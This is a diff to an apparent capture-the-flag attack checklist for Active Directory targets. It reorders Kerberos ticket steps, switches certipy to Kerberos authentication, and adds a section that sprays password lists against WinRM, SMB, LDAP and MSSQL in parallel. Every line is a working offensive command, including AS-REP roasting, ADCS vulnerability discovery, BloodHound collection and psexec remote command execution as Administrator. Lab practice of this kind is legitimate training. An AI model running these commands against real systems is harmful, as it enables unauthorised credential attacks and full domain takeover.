@@ -123,18 +123,24 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 
 # Exploitation
-## Initial Enumeration
-sudo ntpdate -u $TARGET
+## Enumerate
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'; echo ''
-read "?Please add 'dnsHostName' to DC and Domain in MegaSheet then press any key to continue..."
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
+sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-certipy-ad find -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
+certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+
+## Spray
+(nxc winrm "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
+(nxc smb "$TARGET"  --dns-server $TARGET -u usernames -p passwords -k &)
+(nxc ldap "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
+(nxc mssql "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
 
 ## ROOT FLAG
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
